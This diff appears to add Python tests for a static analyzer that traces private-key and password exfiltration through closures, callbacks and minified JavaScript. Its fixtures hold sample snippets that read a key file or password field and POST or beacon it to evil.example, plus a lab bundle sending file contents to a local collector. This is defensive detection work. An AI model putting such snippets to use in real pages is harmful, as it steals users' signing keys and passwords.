@@ -342,3 +342,145 @@ def test_la_confianza_baja_cuando_el_flujo_cruza_funciones():
     assert directo[0].confidence is Confidence.HIGH
     assert indirecto[0].confidence is Confidence.MEDIUM
     assert indirecto[0].hops >= 1
+
+
+# ----------------------------------------------------------------------
+# Del PR #2: propagacion sin depender de los nombres de variable
+# ----------------------------------------------------------------------
+
+
+# ----------------------------------------------------------------------
+# Lo que destapo el codigo empaquetado y minificado
+# ----------------------------------------------------------------------
+
+def api_private_paths(code: str):
+    """Rutas privadas cuyo origen es una API, no una heuristica de nombre."""
+    return [p for p in private_paths(code) if p.source.kind == "api"]
+
+
+def test_callback_capturado_por_clausura():
+    """`labMain(handler)` invoca `handler` desde un manejador anidado."""
+    paths = api_private_paths("""
+        function labMain(handler) {
+          document.getElementById('sign').addEventListener('click', async function () {
+            const f = document.getElementById('key-file').files[0];
+            await handler(f);
+          });
+        }
+        labMain(async function (x) {
+          await fetch('https://evil.example/c', { method: 'POST', body: x });
+        });
+    """)
+    assert paths, "la procedencia no cruzo el callback"
+    assert paths[0].source.name == "input.files"
+
+
+def test_callback_a_una_funcion_invocada_en_el_acto():
+    """Lo que genera un bundler al inlinar: `!function (cb) {...}(handler)`."""
+    paths = api_private_paths("""
+        !function (cb) {
+          const f = document.getElementById('key-file').files[0];
+          cb(f);
+        }(function (x) { fetch('https://evil.example/c', { method: 'POST', body: x }); });
+    """)
+    assert paths
+
+
+def test_los_retornos_distinguen_el_punto_de_llamada():
+    """`leer(.key)` y `leer(.cer)` comparten funcion, no procedencia.
+
+    Sin esta distincion el certificado — que viaja con la firma — arrastraba
+    la procedencia del .key: un falso positivo sobre el envio legitimo.
+    """
+    paths = private_paths("""
+        function leer(file) { return file.arrayBuffer(); }
+        async function onSign() {
+          const k = await leer(document.getElementById('key-file').files[0]);
+          const c = await leer(document.getElementById('cer-file').files[0]);
+          await fetch('/api/recibo', { method: 'POST', body: c });
+        }
+    """)
+    assert paths == [], "el certificado heredo la procedencia del .key"
+
+
+def test_una_funcion_que_firma_no_devuelve_la_clave():
+    """El resumen de `firmar(clave, doc)` deja pasar solo lo publico."""
+    paths = private_paths("""
+        async function firmar(privateKey, doc) {
+          return crypto.subtle.sign('RSASSA-PKCS1-v1_5', privateKey, doc);
+        }
+        async function onSign(keyBytes) {
+          const key = await crypto.subtle.importKey('pkcs8', keyBytes, alg, false, ['sign']);
+          const firma = await firmar(key, 'documento');
+          await fetch('/api/recibo', { method: 'POST', body: firma });
+        }
+    """)
+    assert paths == []
+
+
+def test_nombres_reutilizados_en_bloques_no_se_mezclan():
+    """terser reutiliza `t` en un bloque anidado; son variables distintas."""
+    paths = private_paths("""
+        async function onSign() {
+          const t = document.getElementById('key-file');
+          try {
+            const t = document.getElementById('cer-file').files[0];
+            await fetch('/api/cert', { method: 'POST', body: t });
+          } catch (e) {}
+        }
+    """)
+    assert paths == [], "el .cer del bloque interior heredo la pista del .key exterior"
+
+
+def test_el_id_del_campo_etiqueta_lo_que_se_lee():
+    """La minificacion borra los nombres, pero no los ids del HTML."""
+    paths = api_private_paths("""
+        !function () {
+          const n = document.getElementById("password").value;
+          navigator.sendBeacon("https://evil.example/b", n);
+        }();
+    """)
+    assert paths
+    assert Tag.KEY_PASSWORD.value in paths[0].labels
+
+
+def test_un_elemento_por_si_mismo_no_es_material_sensible():
+    """La pista solo cuenta al leer su contenido, no al usar el elemento."""
+    paths = private_paths("""
+        !function () {
+          const el = document.getElementById("password");
+          fetch("/api/ui", { method: "POST", body: String(el.offsetWidth) });
+        }();
+    """)
+    assert paths == []
+
+
+def test_bundle_minificado_del_laboratorio(lab_sources):
+    """demo-minified: la ruta real sobrevive a la minificacion.
+
+    El bundle es demo-key-exfiltration tras terser con mangle: no queda ningun
+    nombre local. La ruta de exfiltracion debe seguir encontrandose -- desde la
+    fuente real, FileReader.result, hasta el fetch al recolector -- y
+    etiquetarse UNCLASSIFIED: en este codigo nada dice estaticamente que sean
+    los bytes del .key, porque el archivo se guarda en ``state.key`` dentro de
+    un listener y se lee en otra funcion, un flujo por propiedades de objeto
+    que este analizador no sigue. Afirmar mas seria inventar.
+
+    La version del PR #2 esperaba una ruta privada porque su laboratorio leia
+    ``getElementById('key-file').files[0]`` en el mismo sitio; esa capacidad
+    -- el id del campo sobrevive a la minificacion -- la cubre
+    test_el_id_del_campo_etiqueta_lo_que_se_lee.
+
+    Esta prueba encontro un defecto de la fusion: un marcador simbolico de
+    parametro contaba como etiqueta concreta y borraba UNCLASSIFIED del
+    resumen de readFile, con lo que la ruta desaparecia entera.
+    """
+    paths = analyze_source(lab_sources["demo-minified"], "bundle.min.js")
+    exfiltracion = [p for p in paths
+                    if p.channel == "network" and p.source.name == "FileReader.result"
+                    and "localhost:8766" in p.sink_snippet]
+    assert exfiltracion, "la minificacion borro la ruta de exfiltracion"
+    assert exfiltracion[0].source.kind == "api"
+    assert Tag.UNCLASSIFIED.value in exfiltracion[0].labels
+    assert not exfiltracion[0].private, "se afirmo la clave sin evidencia"
+
